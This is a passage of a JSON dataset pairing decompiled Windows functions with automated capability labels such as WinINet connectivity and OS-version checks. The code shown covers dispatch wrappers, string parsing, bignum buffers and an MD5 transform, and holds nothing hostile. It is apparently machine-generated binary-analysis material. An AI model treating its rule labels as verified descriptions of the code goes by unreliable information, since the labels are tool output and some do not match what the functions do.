            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.200232ea(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.20022fde();\n    if (iVar2 == 0) {\n        if ((***arg_8h < 0x2d) || (pcVar1 = (**arg_8h)[0xb],  pcVar1 == NULL)) {\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((iVar2 != 0) && ((*arg_8h)[1] != 0)) {\n                iVar2 = 0x21590006;\n            }\n        }\n        fcn.20022f3c();\n    }\n    return iVar2;\n}\n",
        "token_count": 223
    },
    "20023346": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20023346(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.20022fde();\n    if (iVar2 == 0) {\n        if ((***arg_8h < 0x35) || (pcVar1 = (**arg_8h)[0xd],  pcVar1 == NULL)) {\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((iVar2 != 0) && ((*arg_8h)[1] != 0)) {\n                iVar2 = 0x21590006;\n            }\n        }\n        fcn.20022f3c();\n    }\n    return iVar2;\n}\n",
        "token_count": 222
    },
    "200233a2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.200233a2(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.20022fde();\n    if (iVar2 == 0) {\n        if ((***arg_8h < 0x39) || (pcVar1 = (**arg_8h)[0xe],  pcVar1 == NULL)) {\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((iVar2 != 0) && ((*arg_8h)[1] != 0)) {\n                iVar2 = 0x21590006;\n            }\n        }\n        fcn.20022f3c();\n    }\n    return iVar2;\n}\n",
        "token_count": 223
    },
    "200233fe": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.200233fe(void)\n\n{\n    code *pcVar1;\n    int32_t **in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = fcn.20022fde();\n    if (iVar2 == 0) {\n        if ((***in_EAX < 0x3d) || (pcVar1 = (**in_EAX)[0xf],  pcVar1 == NULL)) {\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)();\n            if ((iVar2 != 0) && ((*in_EAX)[1] != 0)) {\n                iVar2 = 0x21590006;\n            }\n        }\n        fcn.20022f3c();\n    }\n    return iVar2;\n}\n",
        "token_count": 175
    },
    "20023757": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20023757(char **arg_8h, int32_t dest, uint32_t arg_10h, char **arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    \n    if (**arg_8h == '\\0') {\n        uVar1 = 0;\n    }\n    else {\n        iVar2 = (*_sym.imp.ntdll.dll_strchr)(*arg_8h, 0x3d);\n        if (iVar2 == 0) {\n            if (arg_10h != 0) {\n                (*_sym.imp.ntdll.dll_strncpy)(dest, *arg_8h, arg_10h);\n                *(dest + -1 + arg_10h) = 0;\n            }\n            iVar2 = sub.ntdll.dll_strlen(*arg_8h);\n            pcVar3 = *arg_8h + iVar2;\n        }\n        else {\n            iVar2 = iVar2 - *arg_8h;\n            if (arg_10h != 0) {\n                if (arg_10h < iVar2 + 1U) {\n                    iVar2 = arg_10h - 1;\n                }\n                sub.ntdll.dll_memcpy(dest, *arg_8h, iVar2);\n                *(iVar2 + dest) = 0;\n            }\n            pcVar3 = *arg_8h + iVar2 + 1;\n        }\n        *arg_14h = pcVar3;\n        iVar2 = sub.ntdll.dll_strlen(*arg_8h);\n        *arg_8h = *arg_8h + iVar2 + 1;\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 373
    },
    "2002421a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2002421a(int32_t arg_8h)\n\n{\n    int32_t **arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_184h;\n    uint var_4h;\n    \n    var_4h = 0;\n    fcn.20025bc7(&var_184h);\n    arg_8h_00 = *(arg_8h + 0x18);\n    if (arg_8h_00 == NULL) {\n        arg_8h_00 = fcn.20024546();\n        if (arg_8h_00 == NULL) goto code_r0x2002430c;\n        do {\n            iVar1 = fcn.200262b4(arg_8h_00, *(arg_8h + 8));\n            if (iVar1 == 0) goto code_r0x200242fb;\n        } while ((arg_8h_00[1] == NULL) || ((arg_8h_00[1] == 0x1 && (**arg_8h_00 == 0))));\n    }\n    iVar1 = *(arg_8h + 0x14);\n    if ((iVar1 != 0) || (iVar1 = fcn.20024546(),  iVar1 != 0)) {\n        if ((*(arg_8h + 0x20) == 0) && ((*(arg_8h + 0x1c) & 1) != 0)) {\n            iVar2 = fcn.200260f3();\n            *(arg_8h + 0x20) = iVar2;\n            if ((iVar2 == 0) || (iVar2 = fcn.20025f63(iVar2, *(arg_8h + 8), &var_184h),  iVar2 != 0))\n            goto code_r0x200242bb;\n        }\n        else {\ncode_r0x200242bb:\n            iVar2 = (**(*(arg_8h + 0x44) + 0xc))\n                              (arg_8h, iVar1, *(arg_8h + 0xc), arg_8h_00, *(arg_8h + 8), &var_184h, *(arg_8h + 0x20));\n            if (iVar2 != 0) {\n                *(arg_8h + 0x14) = iVar1;\n                *(arg_8h + 0x18) = arg_8h_00;\n                var_4h = 1;\n            }\n        }\n        if ((iVar1 != 0) && (*(arg_8h + 0x14) == 0)) {\n            fcn.20024501(iVar1);\n        }\n    }\ncode_r0x200242fb:\n    if ((arg_8h_00 != NULL) && (*(arg_8h + 0x18) == 0)) {\n        fcn.20024501(arg_8h_00);\n    }\ncode_r0x2002430c:\n    fcn.20025bf9(&var_184h);\n    return var_4h;\n}\n",
        "token_count": 688
    },
    "20024320": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20024320(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint uVar2;\n    uint var_180h;\n    \n    uVar2 = 0xffffffff;\n    fcn.20025bc7(&var_180h);\n    fcn.20025c2c(&var_180h);\n    arg_8h_00 = fcn.20025c4b(&var_180h);\n    if (*(arg_10h + 0x18) != 0) {\n        if ((*(arg_10h + 0x20) == 0) && ((*(arg_10h + 0x1c) & 1) != 0)) {\n            iVar1 = fcn.200260f3();\n            *(arg_10h + 0x20) = iVar1;\n            if (iVar1 != 0) {\n                iVar1 = fcn.20025f63(iVar1, *(arg_10h + 8), &var_180h);\n                if (iVar1 == 0) goto code_r0x200243c0;\n            }\n        }\n        iVar1 = (**(*(arg_10h + 0x44) + 0xc))\n                          (arg_10h, arg_8h_00, arg_ch, *(arg_10h + 0x18), *(arg_10h + 8), &var_180h, *(arg_10h + 0x20));\n        if (iVar1 != 0) {\n            uVar2 = fcn.20024825(arg_8h_00, arg_8h);\n        }\n    }\ncode_r0x200243c0:\n    fcn.20025c80(&var_180h);\n    fcn.20025bf9(&var_180h);\n    return uVar2;\n}\n",
        "token_count": 425
    },
    "200243e1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.200243e1(uint noname_0, uint arg_ch, uint *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    if (arg_10h[1] == 1) {\n        fcn.2002673e(arg_ch, **arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    }\n    else {\n        fcn.20026405(arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "20024488": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.20024488(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    \n    if (param_1[1] == 0) {\n        return 0;\n    }\n    iVar1 = fcn.2002443e(*(*param_1 + -4 + param_1[1] * 4));\n    return iVar1 + -0x20 + extraout_ECX * 0x20;\n}\n",
        "token_count": 108
    },
    "2002456e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.2002456e(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_ch <= arg_8h[2]) {\n        return arg_8h;\n    }\n    if (((0xffffff < arg_ch) || ((*(arg_8h + 4) & 2) != 0)) ||\n       (puVar4 = (*_sym.imp.msvcrt.dll_calloc)(1, arg_ch * 4 + 4),  puVar4 == NULL)) {\n        return NULL;\n    }\n    puVar6 = *arg_8h;\n    if (puVar6 == NULL) goto code_r0x20024628;\n    puVar5 = puVar4;\n    for (iVar8 = arg_8h[1] >> 2; 0 < iVar8; iVar8 = iVar8 + -1) {\n        uVar1 = puVar6[2];\n        uVar2 = puVar6[3];\n        uVar3 = *puVar6;\n        puVar5[1] = puVar6[1];\n        puVar5[2] = uVar1;\n        *puVar5 = uVar3;\n        puVar5[3] = uVar2;\n        puVar5 = puVar5 + 4;\n        puVar6 = puVar6 + 4;\n    }\n    uVar7 = arg_8h[1] & 3;\n    if (uVar7 == 1) {\ncode_r0x20024616:\n        *puVar5 = *puVar6;\n    }\n    else {\n        if (uVar7 == 2) {\ncode_r0x20024610:\n            puVar5[1] = puVar6[1];\n            goto code_r0x20024616;\n        }\n        if (uVar7 == 3) {\n            puVar5[2] = puVar6[2];\n            goto code_r0x20024610;\n        }\n    }\n    (*_sym.imp.msvcrt.dll_free)(*arg_8h);\ncode_r0x20024628:\n    arg_8h[2] = arg_ch;\n    *arg_8h = puVar4;\n    puVar4 = puVar4 + arg_8h[1];\n    for (iVar8 = arg_ch - arg_8h[1] >> 3; 0 < iVar8; iVar8 = iVar8 + -1) {\n        *puVar4 = 0;\n        puVar4[1] = 0;\n        puVar4[2] = 0;\n        puVar4[3] = 0;\n        puVar4[4] = 0;\n        puVar4[5] = 0;\n        puVar4[6] = 0;\n        puVar4[7] = 0;\n        puVar4 = puVar4 + 8;\n    }\n    uVar7 = arg_8h[2] - arg_8h[1] & 7;\n    if (uVar7 != 0) {\n        for (; uVar7 != 0; uVar7 = uVar7 - 1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 794
    },
    "20024717": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.20024717(int32_t **param_1, int32_t param_2)\n\n{\n    int32_t **ppiVar1;\n    \n    ppiVar1 = param_1;\n    if (param_1[2] == NULL) {\n        ppiVar1 = fcn.2002456e(param_1, 2);\n    }\n    if (ppiVar1 != NULL) {\n        param_1[3] = NULL;\n        param_1[1] = NULL;\n        **param_1 = param_2;\n        if (**param_1 != 0) {\n            param_1[1] = 0x1;\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 158
    },
    "2002475a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.2002475a(uint8_t *arg_8h, int32_t arg_ch, int32_t *arg_10h)\n\n{\n    int32_t *arg_8h_00;\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    \n    arg_8h_00 = arg_10h;\n    if ((arg_10h != NULL) || (arg_8h_00 = fcn.20024546(),  piVar1 = arg_8h_00,  arg_8h_00 != NULL)) {\n        uVar6 = 0;\n        arg_10h = arg_ch;\n        piVar1 = arg_8h_00;\n        if (arg_ch == 0) {\n            arg_8h_00[1] = 0;\n        }\n        else {\n            iVar2 = arg_ch * 8 + 0x2f;\n            if (arg_8h_00[2] < iVar2 + (iVar2 >> 0x1f & 0x1fU) >> 5) {\n                iVar2 = arg_ch * 8 + 0x10;\n                piVar1 = fcn.2002456e(arg_8h_00, (iVar2 + (iVar2 >> 0x1f & 0x1fU) >> 5) + 1);\n            }\n            if (piVar1 != NULL) {\n                iVar2 = (arg_ch - 1U >> 2) + 1;\n                arg_8h_00[1] = iVar2;\n                if (arg_ch != 0) {\n                    iVar2 = iVar2 * 4;\n                    uVar4 = arg_ch - 1U & 3;\n                    do {\n                        arg_10h = arg_10h + -1;\n                        uVar6 = uVar6 << 8 | *arg_8h;\n                        arg_8h = arg_8h + 1;\n                        uVar5 = uVar4 - 1;\n                        if (uVar4 == 0) {\n                            iVar2 = iVar2 + -4;\n                            *(iVar2 + *arg_8h_00) = uVar6;\n                            uVar6 = 0;\n                            uVar5 = 3;\n                        }\n                        uVar4 = uVar5;\n                    } while (arg_10h != NULL);\n                }\n                piVar1 = arg_8h_00;\n                if (0 < arg_8h_00[1]) {\n                    piVar3 = *arg_8h_00 + -4 + arg_8h_00[1] * 4;\n                    do {\n                        iVar2 = *piVar3;\n                        piVar3 = piVar3 + -1;\n                        if (iVar2 != 0) {\n                            return arg_8h_00;\n                        }\n                        arg_8h_00[1] = arg_8h_00[1] + -1;\n                    } while (0 < arg_8h_00[1]);\n                }\n            }\n        }\n    }\n    return piVar1;\n}\n",
        "token_count": 713
    },
    "20024a46": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.20024a46(int32_t param_1)\n\n{\n    int32_t arg_8h;\n    uint uVar1;\n    \n    if (param_1 != 0) {\n        arg_8h = fcn.20024546();\n        if (arg_8h != 0) {\n            uVar1 = fcn.2002466f(arg_8h, param_1);\n            return uVar1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 106
    },
    "20024a91": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20024a91(int32_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t *piVar8;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    piVar1 = arg_8h;\n    iVar2 = *arg_8h;\n    var_4h = arg_8h[2];\n    var_8h = arg_8h[3];\n    if (arg_10h != 0) {\n        piVar8 = arg_ch + 0x38;\n        arg_8h = arg_8h[1];\n        do {\n            arg_10h = arg_10h + -1;\n            iVar2 = sub.msvcrt.dll__lrotl(iVar2 + -0x28955b88 + ((var_8h ^ var_4h) & arg_8h ^ var_8h) + piVar8[-0xe], 7)\n            ;\n            uVar7 = iVar2 + arg_8h;\n            iVar2 = sub.msvcrt.dll__lrotl\n                              (var_8h + 0xe8c7b756 + ((var_4h ^ arg_8h) & uVar7 ^ var_4h) + piVar8[-0xd], 0xc);\n            uVar3 = iVar2 + uVar7;\n            iVar2 = sub.msvcrt.dll__lrotl\n                              (var_4h + 0x242070db + ((arg_8h ^ uVar7) & uVar3 ^ arg_8h) + piVar8[-0xc], 0x11);\n            uVar4 = iVar2 + uVar3;\n            iVar2 = sub.msvcrt.dll__lrotl(arg_8h + 0xc1bdceeeU + ((uVar3 ^ uVar7) & uVar4 ^ uVar7) + piVar8[-0xb], 0x16)\n            ;\n            uVar5 = iVar2 + uVar4;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar7 + 0xf57c0faf + ((uVar3 ^ uVar4) & uVar5 ^ uVar3) + piVar8[-10], 7);\n            uVar7 = iVar2 + uVar5;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar3 + 0x4787c62a + ((uVar4 ^ uVar5) & uVar7 ^ uVar4) + piVar8[-9], 0xc);\n            uVar3 = iVar2 + uVar7;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar4 + 0xa8304613 + ((uVar5 ^ uVar7) & uVar3 ^ uVar5) + piVar8[-8], 0x11);\n            uVar4 = iVar2 + uVar3;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar5 + 0xfd469501 + ((uVar3 ^ uVar7) & uVar4 ^ uVar7) + piVar8[-7], 0x16);\n            uVar5 = iVar2 + uVar4;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar7 + 0x698098d8 + ((uVar3 ^ uVar4) & uVar5 ^ uVar3) + piVar8[-6], 7);\n            uVar7 = iVar2 + uVar5;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar3 + 0x8b44f7af + ((uVar4 ^ uVar5) & uVar7 ^ uVar4) + piVar8[-5], 0xc);\n            uVar3 = iVar2 + uVar7;\n            iVar2 = sub.msvcrt.dll__lrotl((uVar4 - 0xa44f) + ((uVar5 ^ uVar7) & uVar3 ^ uVar5) + piVar8[-4], 0x11);\n            uVar4 = iVar2 + uVar3;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar5 + 0x895cd7be + ((uVar3 ^ uVar7) & uVar4 ^ uVar7) + piVar8[-3], 0x16);\n            uVar5 = iVar2 + uVar4;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar7 + 0x6b901122 + ((uVar3 ^ uVar4) & uVar5 ^ uVar3) + piVar8[-2], 7);\n            uVar7 = iVar2 + uVar5;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar3 + 0xfd987193 + ((uVar4 ^ uVar5) & uVar7 ^ uVar4) + piVar8[-1], 0xc);\n            uVar3 = iVar2 + uVar7;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar4 + 0xa679438e + ((uVar5 ^ uVar7) & uVar3 ^ uVar5) + *piVar8, 0x11);\n            uVar4 = iVar2 + uVar3;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar5 + 0x49b40821 + ((uVar3 ^ uVar7) & uVar4 ^ uVar7) + piVar8[1], 0x16);\n            uVar5 = iVar2 + uVar4;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar7 + 0xf61e2562 + ((uVar4 ^ uVar5) & uVar3 ^ uVar4) + piVar8[-0xd], 5);\n            uVar7 = iVar2 + uVar5;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar3 + 0xc040b340 + ((uVar5 ^ uVar7) & uVar4 ^ uVar5) + piVar8[-8], 9);\n            uVar3 = iVar2 + uVar7;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar4 + 0x265e5a51 + ((uVar3 ^ uVar7) & uVar5 ^ uVar7) + piVar8[-3], 0xe);\n            uVar4 = iVar2 + uVar3;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar5 + 0xe9b6c7aa + ((uVar3 ^ uVar4) & uVar7 ^ uVar3) + piVar8[-0xe], 0x14);\n            uVar5 = iVar2 + uVar4;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar7 + 0xd62f105d + ((uVar4 ^ uVar5) & uVar3 ^ uVar4) + piVar8[-9], 5);\n            uVar7 = iVar2 + uVar5;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar3 + 0x2441453 + ((uVar5 ^ uVar7) & uVar4 ^ uVar5) + piVar8[-4], 9);\n            uVar3 = iVar2 + uVar7;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar4 + 0xd8a1e681 + ((uVar3 ^ uVar7) & uVar5 ^ uVar7) + piVar8[1], 0xe);\n            uVar4 = iVar2 + uVar3;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar5 + 0xe7d3fbc8 + ((uVar3 ^ uVar4) & uVar7 ^ uVar3) + piVar8[-10], 0x14);\n            uVar5 = iVar2 + uVar4;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar7 + 0x21e1cde6 + ((uVar4 ^ uVar5) & uVar3 ^ uVar4) + piVar8[-5], 5);\n            uVar7 = iVar2 + uVar5;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar3 + 0xc33707d6 + ((uVar5 ^ uVar7) & uVar4 ^ uVar5) + *piVar8, 9);\n            uVar3 = iVar2 + uVar7;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar4 + 0xf4d50d87 + ((uVar3 ^ uVar7) & uVar5 ^ uVar7) + piVar8[-0xb], 0xe);\n            uVar4 = iVar2 + uVar3;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar5 + 0x455a14ed + ((uVar3 ^ uVar4) & uVar7 ^ uVar3) + piVar8[-6], 0x14);\n            uVar5 = iVar2 + uVar4;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar7 + 0xa9e3e905 + ((uVar4 ^ uVar5) & uVar3 ^ uVar4) + piVar8[-1], 5);\n            uVar7 = iVar2 + uVar5;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar3 + 0xfcefa3f8 + ((uVar5 ^ uVar7) & uVar4 ^ uVar5) + piVar8[-0xc], 9);\n            uVar3 = iVar2 + uVar7;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar4 + 0x676f02d9 + ((uVar3 ^ uVar7) & uVar5 ^ uVar7) + piVar8[-7], 0xe);\n            uVar4 = iVar2 + uVar3;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar5 + 0x8d2a4c8a + ((uVar3 ^ uVar4) & uVar7 ^ uVar3) + piVar8[-2], 0x14);\n            uVar5 = iVar2 + uVar4;\n            iVar2 = sub.msvcrt.dll__lrotl((uVar7 - 0x5c6be) + (uVar3 ^ uVar4 ^ uVar5) + piVar8[-9], 4);\n            uVar7 = iVar2 + uVar5;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar3 + 0x8771f681 + (uVar4 ^ uVar5 ^ uVar7) + piVar8[-6], 0xb);\n            uVar3 = iVar2 + uVar7;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar4 + 0x6d9d6122 + (uVar3 ^ uVar5 ^ uVar7) + piVar8[-3], 0x10);\n            uVar4 = iVar2 + uVar3;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar5 + 0xfde5380c + (uVar3 ^ uVar4 ^ uVar7) + *piVar8, 0x17);\n            uVar5 = iVar2 + uVar4;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar7 + 0xa4beea44 + (uVar3 ^ uVar4 ^ uVar5) + piVar8[-0xd], 4);\n            uVar7 = iVar2 + uVar5;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar3 + 0x4bdecfa9 + (uVar4 ^ uVar5 ^ uVar7) + piVar8[-10], 0xb);\n            uVar3 = iVar2 + uVar7;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar4 + 0xf6bb4b60 + (uVar3 ^ uVar5 ^ uVar7) + piVar8[-7], 0x10);\n            uVar4 = iVar2 + uVar3;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar5 + 0xbebfbc70 + (uVar3 ^ uVar4 ^ uVar7) + piVar8[-4], 0x17);\n            uVar5 = iVar2 + uVar4;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar7 + 0x289b7ec6 + (uVar3 ^ uVar4 ^ uVar5) + piVar8[-1], 4);\n            uVar7 = iVar2 + uVar5;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar3 + 0xeaa127fa + (uVar4 ^ uVar5 ^ uVar7) + piVar8[-0xe], 0xb);\n            uVar3 = iVar2 + uVar7;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar4 + 0xd4ef3085 + (uVar3 ^ uVar5 ^ uVar7) + piVar8[-0xb], 0x10);\n            uVar4 = iVar2 + uVar3;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar5 + 0x4881d05 + (uVar3 ^ uVar4 ^ uVar7) + piVar8[-8], 0x17);\n            uVar5 = iVar2 + uVar4;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar7 + 0xd9d4d039 + (uVar3 ^ uVar4 ^ uVar5) + piVar8[-5], 4);\n            uVar7 = iVar2 + uVar5;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar3 + 0xe6db99e5 + (uVar4 ^ uVar5 ^ uVar7) + piVar8[-2], 0xb);\n            uVar3 = iVar2 + uVar7;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar4 + 0x1fa27cf8 + (uVar3 ^ uVar5 ^ uVar7) + piVar8[1], 0x10);\n            uVar4 = iVar2 + uVar3;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar5 + 0xc4ac5665 + (uVar3 ^ uVar4 ^ uVar7) + piVar8[-0xc], 0x17);\n            uVar5 = iVar2 + uVar4;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar7 + 0xf4292244 + ((~uVar3 | uVar5) ^ uVar4) + piVar8[-0xe], 6);\n            uVar7 = iVar2 + uVar5;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar3 + 0x432aff97 + ((~uVar4 | uVar7) ^ uVar5) + piVar8[-7], 10);\n            uVar3 = iVar2 + uVar7;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar4 + 0xab9423a7 + ((~uVar5 | uVar3) ^ uVar7) + *piVar8, 0xf);\n            uVar4 = iVar2 + uVar3;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar5 + 0xfc93a039 + ((~uVar7 | uVar4) ^ uVar3) + piVar8[-9], 0x15);\n            uVar5 = iVar2 + uVar4;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar7 + 0x655b59c3 + ((~uVar3 | uVar5) ^ uVar4) + piVar8[-2], 6);\n            uVar7 = iVar2 + uVar5;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar3 + 0x8f0ccc92 + ((~uVar4 | uVar7) ^ uVar5) + piVar8[-0xb], 10);\n            uVar3 = iVar2 + uVar7;\n            iVar2 = sub.msvcrt.dll__lrotl((uVar4 - 0x100b83) + ((~uVar5 | uVar3) ^ uVar7) + piVar8[-4], 0xf);\n            uVar4 = iVar2 + uVar3;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar5 + 0x85845dd1 + ((~uVar7 | uVar4) ^ uVar3) + piVar8[-0xd], 0x15);\n            uVar5 = iVar2 + uVar4;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar7 + 0x6fa87e4f + ((~uVar3 | uVar5) ^ uVar4) + piVar8[-6], 6);\n            uVar7 = iVar2 + uVar5;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar3 + 0xfe2ce6e0 + ((~uVar4 | uVar7) ^ uVar5) + piVar8[1], 10);\n            uVar3 = iVar2 + uVar7;\n            iVar2 = sub.msvcrt.dll__lrotl(uVar4 + 0xa3014314 + 